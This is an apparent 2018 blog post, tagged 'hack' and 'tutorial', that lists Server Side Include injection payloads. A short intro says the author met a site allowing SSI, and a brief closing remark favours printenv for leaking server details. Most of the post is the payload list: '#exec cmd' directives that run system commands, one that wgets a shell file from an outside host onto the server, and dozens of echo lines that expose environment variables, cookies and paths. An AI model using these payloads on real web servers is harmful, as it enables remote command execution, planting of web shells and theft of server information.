---
title: List of SSI payloads
author: ヤング marduc
type: post
date: 2018-03-24T19:18:53+00:00
url: /2018/03/24/list-of-ssi-payloads/
featured_image: /wp-content/uploads/2018/03/cover-1.jpg
yuzo_related_post_metabox:
  - 'a:3:{s:17:"yuzo_include_post";s:0:"";s:17:"yuzo_exclude_post";s:0:"";s:21:"yuzo_disabled_related";N;}'
mashsb_timestamp:
  - 1587860094
mashsb_jsonshares:
  - '{"total":0,"error":{"facebook_error":"{"error":{"message":"(#12) share field is deprecated for versions v2.9 and higher","type":"OAuthException","code":12,"fbtrace_id":"AZEFtFr_Anmzx1G4N1MqSU-"}}"},"facebook_total":0}'
categories:
  - Security
  - Tuts
tags:
  - hack
  - tutorial

---
Recently I faced a situation that a website allowed the use of Server Side Includes. This was something new for me because I didn&#8217;t know many things about it and what payloads I could use. Luckily <!--more-->every time someone in the team already knows about it and below is a list of payloads that can be used to exploit this feature.

<pre>&lt;pre&gt;&lt;!--#exec cmd="ls" --&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;!--#echo var="DATE_LOCAL" --&gt; &lt;/pre&gt;
&lt;pre&gt;&lt;!--#exec cmd="whoami"--&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;!--#exec cmd="dir" --&gt;&lt;/pre&gt;
&lt;!--#exec cmd="ls" --&gt;
&lt;!--#exec cmd="wget http://website.com/dir/shell.txt" --&gt;
&lt;!--#exec cmd="/bin/ls /" --&gt;
&lt;!--#exec cmd="dir" --&gt;
&lt;!--#exec cmd="cd C:\WINDOWS\System32"&gt;
&lt;!--#config errmsg="File not found, informs users and password"--&gt;
&lt;!--#echo var="DOCUMENT_NAME" --&gt;
&lt;!--#echo var="DOCUMENT_URI" --&gt;
&lt;!--#config timefmt="A %B %d %Y %r"--&gt;
&lt;!--#fsize file="ssi.shtml" --&gt;
&lt;!--#include file=?UUUUUUUU...UU?--&gt;
&lt;!--#echo var="DATE_LOCAL" --&gt; 
&lt;!--#exec cmd="whoami"--&gt; 
&lt;!--#printenv --&gt;
&lt;!--#flastmod virtual="echo.html" --&gt;
&lt;!--#echo var="auth_type" --&gt;
&lt;!--#echo var="http_referer" --&gt;
&lt;!--#echo var="content_length" --&gt;
&lt;!--#echo var="content_type" --&gt;
&lt;!--#echo var="http_accept_encoding" --&gt;
&lt;!--#echo var="forwarded" --&gt;
&lt;!--#echo var="document_uri" --&gt;
&lt;!--#echo var="date_gmt" --&gt;
&lt;!--#echo var="date_local" --&gt;
&lt;!--#echo var="document_name" --&gt;
&lt;!--#echo var="document_root" --&gt;
&lt;!--#echo var="from" --&gt;
&lt;!--#echo var="gateway_interface" --&gt;
&lt;!--#echo var="http_accept" --&gt;
&lt;!--#echo var="http_accept_charset" --&gt;
&lt;!--#echo var="http_accept_language" --&gt;
&lt;!--#echo var="http_connection" --&gt;
&lt;!--#echo var="http_cookie" --&gt;
&lt;!--#echo var="http_form" --&gt;
&lt;!--#echo var="http_host" --&gt;
&lt;!--#echo var="user_name" --&gt;
&lt;!--#echo var="unique_id" --&gt;
&lt;!--#echo var="tz" --&gt;
&lt;!--#echo var="total_hits" --&gt;
&lt;!--#echo var="server_software" --&gt;
&lt;!--#echo var="server_protocol" --&gt;
&lt;!--#echo var="server_port" --&gt;
&lt;!--#echo var="server_name --&gt;
&lt;!--#echo var="server_addr" --&gt;
&lt;!--#echo var="server_admin" --&gt;
&lt;!--#echo var="script_url" --&gt;
&lt;!--#echo var="script_uri" --&gt;
&lt;!--#echo var="script_name" --&gt;
&lt;!--#echo var="script_filename" --&gt;
&lt;!--#echo var="netsite_root" --&gt;
&lt;!--#echo var="site_htmlroot" --&gt;
&lt;!--#echo var="path_translated" --&gt;
&lt;!--#echo var="path_info_translated" --&gt;
&lt;!--#echo var="request_uri" --&gt;
&lt;!--#echo var="request_method" --&gt;	
&lt;!--#echo var="remote_user" --&gt;
&lt;!--#echo var="remote_addr" --&gt;
&lt;!--#echo var="http_client_ip" --&gt;
&lt;!--#echo var="remote_port" --&gt;
&lt;!--#echo var="remote_ident" --&gt;
&lt;!--#echo var="remote_host" --&gt;
&lt;!--#echo var="query_string_unescaped" --&gt;
&lt;!--#echo var="query_string" --&gt;
&lt;!--#echo var="path_translated" --&gt;
&lt;!--#echo var="path_info" --&gt;
&lt;!--#echo var="path" --&gt;
&lt;!--#echo var="page_count" --&gt;
&lt;!--#echo var="last_modified" --&gt;
&lt;!--#echo var="http_user_agent" --&gt;
&lt;!--#echo var="http_ua_os" --&gt;
&lt;!--#echo var="http_ua_cpu" --&gt;
</pre>

You will notice in some cases that it is not possible to run system commands, but it is possible to echo things. One of the payloads that I liked the most was printenv, because it gives a lot of useful information about the server, permissions, local IPs etc.

If you have any more SSI payloads that you would like me to include, feel free to share.

Links: <a href="https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection" target="_blank" rel="noopener">OWASP</a>